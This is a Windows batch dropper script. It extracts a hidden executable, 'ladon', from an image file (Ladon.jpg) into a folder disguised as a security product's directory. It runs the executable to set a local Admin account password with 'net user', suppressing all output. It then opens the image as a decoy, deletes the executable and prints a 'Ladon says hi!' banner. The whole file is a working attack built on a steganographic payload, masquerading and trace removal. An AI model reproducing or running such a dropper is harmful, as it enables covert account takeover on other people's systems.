��&cls
@chcp 936 > NUL
@echo off
IF NOT EXIST "%JAVA_HOME%\bin\java.exe" goto nojdk
:START
SET NEST=C:\ProgramData\Cyvera\Prevention
if exist %NEST% goto ACTION
:CREAT_NEST
md %NEST%
:ACTION
"%JAVA_HOME%\bin\java" -jar key.jar u Ladon.jpg %NEST% ladon > NUL
SET Mantra="%NEST%\ladon" "net user Admin %LUCK_WORDS%"
cmd /c "%Mantra%" > NUL
start "" "%~dp0Ladon.jpg"
IF NOT EXIST "%NEST%\ladon.exe" goto end
DEL /q "%NEST%\ladon.exe"
goto end
:nojdk
ECHO JAVA_HOME wasn't set. Please set in System Properties or this BAT file.
pause
:end
echo *****************************************************************************************
echo *                                   Ladon says hi!                                      *
echo *****************************************************************************************
echo          _              _                 _                  _                _          
echo         _\ \           / /\              /\ \               /\ \             /\ \     _  
echo        /\__ \         / /  \            /  \ \____         /  \ \           /  \ \   /\_\
echo       / /_ \_\       / / /\ \          / /\ \_____\       / /\ \ \         / /\ \ \_/ / /
echo      / / /\/_/      / / /\ \ \        / / /\/___  /      / / /\ \ \       / / /\ \___/ / 
echo     / / /          / / /  \ \ \      / / /   / / /      / / /  \ \_\     / / /  \/____/  
echo    / / /          / / /___/ /\ \    / / /   / / /      / / /   / / /    / / /    / / /   
echo   / / / ____     / / /_____/ /\ \  / / /   / / /      / / /   / / /    / / /    / / /    
echo  / /_/_/ ___/\  / /_________/\ \ \ \ \ \__/ / /      / / /___/ / /    / / /    / / /     
echo /_______/\__\/ / / /_       __\ \_\ \ \___\/ /      / / /____\/ /    / / /    / / /      
echo \_______\/     \_\___\     /____/_/  \/_____/       \/_________/     \/_/     \/_/                                                                                                
pause
